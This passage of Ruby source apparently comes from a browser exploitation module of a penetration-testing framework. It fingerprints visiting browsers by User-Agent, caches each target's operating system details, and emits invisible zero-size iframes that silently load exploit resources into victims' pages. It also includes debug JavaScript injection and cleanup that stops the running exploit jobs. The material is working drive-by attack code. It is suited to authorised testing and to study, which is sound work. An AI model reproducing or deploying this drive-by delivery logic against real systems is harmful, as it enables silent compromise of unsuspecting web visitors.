127.0.0.1 is\n          # blacklisted in the Host validations.\n          begin\n\n            # Report a generic fingerprint.match note for the OS normalizer\n            # Previously we reported a javascript_fingerprint type but this\n            # was never used.\n            report_note({\n              :host   => cli.peerhost,\n              :ntype  => 'fingerprint.match',\n              :data   => note_data,\n              :update => :unique_data,\n            })\n            client_info = {\n              :host      => cli.peerhost,\n              :ua_string => request['User-Agent'],\n              :ua_name   => ua_name,\n              :ua_ver    => ua_ver\n            }\n            report_client(client_info)\n          rescue ::Interrupt\n            raise $!\n          rescue ::Exception => e\n            elog('Reporting failed', error: e)\n          end\n        end\n      end\n    end\n\n    # Always populate the target cache since querying the database is too\n    # slow for real-time.\n    key = cli.peerhost + request['User-Agent']\n    @targetcache ||= {}\n    @targetcache[key] ||= {}\n    @targetcache[key][:updated_at] = Time.now.to_i\n\n    # Clean the cache\n    rmq = []\n    @targetcache.each_key do |addr|\n      if (Time.now.to_i > @targetcache[addr][:updated_at]+60)\n        rmq.push addr\n      end\n    end\n    rmq.each {|addr| @targetcache.delete(addr) }\n\n    # Keep the attributes the same as if it were created in\n    # the database.\n    @targetcache[key][:updated_at] = Time.now.to_i\n    @targetcache[key][:ua_string] = request['User-Agent']\n    @targetcache[key][:ua_name] = ua_name\n    @targetcache[key][:ua_ver] = ua_ver\n\n    @targetcache[key][:host] = {}\n    @targetcache[key][:host][:os_name] = os_name\n    @targetcache[key][:host][:os_vendor] = os_vendor\n    @targetcache[key][:host][:os_flavor] = os_flavor\n    @targetcache[key][:host][:os_device] = os_device\n    @targetcache[key][:host][:os_sp] = os_sp\n    @targetcache[key][:host][:os_lang] = os_lang\n\n  end\n\n  # Override super#get_client to use a cache since the database is generally\n  # too slow to be useful for realtime tasks.  This essentially creates an\n  # in-memory database.  The upside is that it works if the database is\n  # broken (which seems to be all the time now).\n  def get_client(opts)\n    host = opts[:host]\n    return @targetcache[opts[:host]+opts[:ua_string]]\n  end\n\n  def build_iframe(resource)\n    ret = ''\n    if (action.name == 'DefangedDetection')\n      ret << \"<p>iframe #{resource}</p>\"\n    else\n      ret << %Q|<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>|\n      #ret << %Q|<iframe src=\"#{resource}\" ></iframe>|\n    end\n    return ret\n  end\n\n  def exploit_resource(name)\n    if (@exploits[name] && @exploits[name].respond_to?(\"get_resource\"))\n      #print_line(\"Returning #{@exploits[name].get_resource.inspect}, for #{name}\")\n      return @exploits[name].get_resource\n    else\n      print_error(\"Don't have an exploit by that name, returning 404#{name}.html\")\n      return \"404#{name}.html\"\n    end\n  end\n\n  def js_debug(msg)\n    if datastore['DEBUG_AUTOPWN']\n      return \"document.body.innerHTML += #{msg};\"\n    end\n    return \"\"\n  end\n\n  def cleanup\n    print_status(\"Cleaning up exploits...\")\n    @exploits.each_pair do |name, mod|\n      # if the module died for some reason, we can't kill it\n      next unless mod\n      framework.jobs[mod.job_id.to_s].stop if framework.jobs[mod.job_id.to_s]\n    end\n    @handler_job_ids.each do |id|\n      framework.jobs[id.to_s].stop if framework.jobs[id.to_s]\n    end\n    super\n  end\nend\n"
}